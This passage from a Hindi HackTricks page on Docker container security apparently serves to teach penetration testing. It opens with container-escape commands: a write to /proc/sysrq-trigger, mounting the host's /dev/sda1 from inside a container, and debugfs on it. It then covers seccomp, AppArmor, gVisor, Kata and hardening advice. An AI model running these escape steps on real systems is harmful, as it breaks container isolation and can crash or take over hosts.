### Check if You Can Write to a File-system
$ echo 1 > /proc/sysrq-trigger

### Check root UUID
$ cat /proc/cmdlineBOOT_IMAGE=/boot/vmlinuz-4.4.0-197-generic root=UUID=b2e62f4f-d338-470e-9ae7-4fc0e014858c ro console=tty1 console=ttyS0 earlyprintk=ttyS0 rootdelay=300- Check Underlying Host Filesystem
$ findfs UUID=<UUID Value>/dev/sda1- Attempt to Mount the Host's Filesystem
$ mkdir /mnt-test
$ mount /dev/sda1 /mnt-testmount: /mnt: permission denied. ---> Failed! but if not, you may have access to the underlying host OS file-system now.

### debugfs (Interactive File System Debugger)
$ debugfs /dev/sda1
```
# कंटेनर सुरक्षा में सुधार

## Docker में Seccomp

यह Docker कंटेनर से बाहर निकलने की तकनीक नहीं है लेकिन एक सुरक्षा सुविधा है जिसका उपयोग Docker करता है और आपको इसके बारे में पता होना चाहिए क्योंकि यह आपको Docker से बाहर निकलने से रोक सकता है:

{% content-ref url="seccomp.md" %}
[seccomp.md](seccomp.md)
{% endcontent-ref %}

## Docker में AppArmor

यह Docker कंटेनर से बाहर निकलने की तकनीक नहीं है लेकिन एक सुरक्षा सुविधा है जिसका उपयोग Docker करता है और आपको इसके बारे में पता होना चाहिए क्योंकि यह आपको Docker से बाहर निकलने से रोक सकता है:

{% content-ref url="apparmor.md" %}
[apparmor.md](apparmor.md)
{% endcontent-ref %}

## AuthZ & AuthN

एक प्राधिकरण प्लगइन Docker **daemon** को **requests** को **approve** या **deny** करता है जो वर्तमान **authentication** संदर्भ और **command** संदर्भ दोनों पर आधारित होता है। **authentication** संदर्भ में सभी **user details** और **authentication** **method** शामिल होते हैं। **command context** में सभी **relevant** **request** डेटा शामिल होता है।

{% content-ref url="broken-reference" %}
[टूटी हुई लिंक](broken-reference)
{% endcontent-ref %}

## gVisor

**gVisor** एक एप्लिकेशन कर्नेल है, जो Go में लिखा गया है, जो लिनक्स सिस्टम सतह का एक बड़ा हिस्सा लागू करता है। इसमें [Open Container Initiative (OCI)](https://www.opencontainers.org) रनटाइम `runsc` शामिल है जो एप्लिकेशन और होस्ट कर्नेल के बीच एक **isolation boundary** प्रदान करता है। `runsc` रनटाइम Docker और Kubernetes के साथ एकीकृत होता है, जिससे सैंडबॉक्स्ड कंटेनर्स चलाना सरल हो जाता है।

{% embed url="https://github.com/google/gvisor" %}

# Kata Containers

**Kata Containers** एक ओपन सोर्स समुदाय है जो एक सुरक्षित कंटेनर रनटाइम बनाने के लिए काम कर रहा है जिसमें हल्के वर्चुअल मशीनें होती हैं जो कंटेनर्स की तरह महसूस और प्रदर्शन करती हैं, लेकिन हार्डवेयर वर्चुअलाइजेशन तकनीक का उपयोग करके दूसरी परत के रूप में **stronger workload isolation** प्रदान करती हैं।

{% embed url="https://katacontainers.io/" %}

## कंटेनर्स को सुरक्षित रूप से उपयोग करें

Docker डिफ़ॉल्ट रूप से कंटेनर्स को प्रतिबंधित और सीमित करता है। इन प्रतिबंधों को कम करने से सुरक्षा मुद्दे पैदा हो सकते हैं, भले ही `--privileged` फ्लैग की पूरी शक्ति के बिना। प्रत्येक अतिरिक्त अनुमति के प्रभाव को स्वीकार करना और कुल मिलाकर अनुमतियों को न्यूनतम आवश्यकता तक सीमित रखना महत्वपूर्ण है।

कंटेनर्स को सुरक्षित रखने के लिए:

* `--privileged` फ्लैग का उपयोग न करें या कंटेनर के अंदर [Docker socket को माउंट](https://raesene.github.io/blog/2016/03/06/The-Dangers-Of-Docker.sock/) न करें। Docker socket कंटेनर्स को स्पॉन करने की अनुमति देता है, इसलिए यह होस्ट का पूरा नियंत्रण लेने का एक आसान तरीका है, उदाहरण के लिए, `--privileged` फ्लैग के साथ एक और कंटेनर चलाकर।
* कंटेनर के अंदर रूट के रूप में न चलाएं। [अलग यूजर](https://docs.docker.com/develop/develop-images/dockerfile_best-practices/#user) का उपयोग करें या [user namespaces](https://docs.docker.com/engine/security/userns-remap/) का उपयोग करें। कंटेनर में रूट होस्ट पर वही होता है जब तक कि उसे user namespaces के साथ रीमैप नहीं किया जाता। यह मुख्य रूप से लिनक्स namespaces, capabilities, और cgroups द्वारा हल्के रूप से प्रतिबंधित होता है।
* [सभी capabilities को ड्रॉप करें](https://docs.docker.com/engine/reference/run/#runtime-privilege-and-linux-capabilities) (`--cap-drop=all`) और केवल उन्हें सक्षम करें जो आवश्यक हैं (`--cap-add=...`). कई workloads को किसी भी capabilities की आवश्यकता नहीं होती और उन्हें जोड़ने से संभावित हमले की गुंजाइश बढ़ जाती है।
* [“no-new-privileges” सुरक्षा विकल्प का उपयोग करें](https://raesene.github.io/blog/2019/06/01/docker-capabilities-and-no-new-privs/) ताकि प्रक्रियाएं अधिक विशेषाधिकार प्राप्त न कर सकें, उदाहरण के लिए suid binaries के माध्यम से।
* [कंटेनर के लिए उपलब्ध संसाधनों को सीमित करें](https://docs.docker.com/engine/reference/run/#runtime-constraints-on-resources)। संसाधन सीमाएं मशीन को सेवा से इनकार हमलों से बचा सकती हैं।
* [seccomp](https://docs.docker.com/engine/security/seccomp/), [AppArmor](https://docs.docker.com/engine/security/apparmor/) (या SELinux) प्रोफाइल्स को समायोजित करें ताकि कंटेनर के लिए उपलब्ध क्रियाओं और syscalls को न्यूनतम आवश्यकता तक सीमित किया जा सके।
* [आधिकारिक docker images](https://docs.docker.com/docker-hub/official_images/) का उपयोग करें या उनके आधार पर अपनी खुद की बनाएं। [backdoored](https://arstechnica.com/information-technology/2018/06/backdoored-images-downloaded-5-million-times-finally-removed-from-docker-hub/) images को विरासत में न लें या उपयोग न करें।
* नियमित रूप से अपनी images को पुनः बनाएं ताकि सुरक्षा पैच लागू किए जा सकें। यह बिना कहे समझा जाता है।

# संदर्भ

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
* [https://twitter.com/\_fel1x/status/1151487051986087936](https://twitter.com/\_fel1x/status/1151487051986087936)
* [https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html](https://ajxchapman.github.io/containers/2020/11/19/privileged-container-escape.html)


<details>

<summary><strong>AWS हैकिंग सीखें शून्य से लेकर हीरो तक</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

HackTricks का समर्थन करने के अन्य तरीके:

* यदि आप चाहते हैं कि आपकी **कंपनी का विज्ञापन HackTricks में दिखाई दे** या **HackTricks को PDF में डाउनलोड करें** तो [**सदस्यता योजनाओं**](https://github.com/sponsors/carlospolop) की जांच करें!
* [**आधिकारिक PEASS & HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा [**NFTs**](https://opensea.io/collection/the-peass-family) का विशेष संग्रह।
* 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) में **शामिल हों** या [**telegram group**](https://t.me/peass) में या **Twitter** 🐦 पर मुझे **follow** करें [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **HackTricks** के लिए PRs सबमिट करके अपनी हैकिंग ट्रिक्स साझा करें। [**HackTricks**](https://github.com/carlospolop/hacktricks) और [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
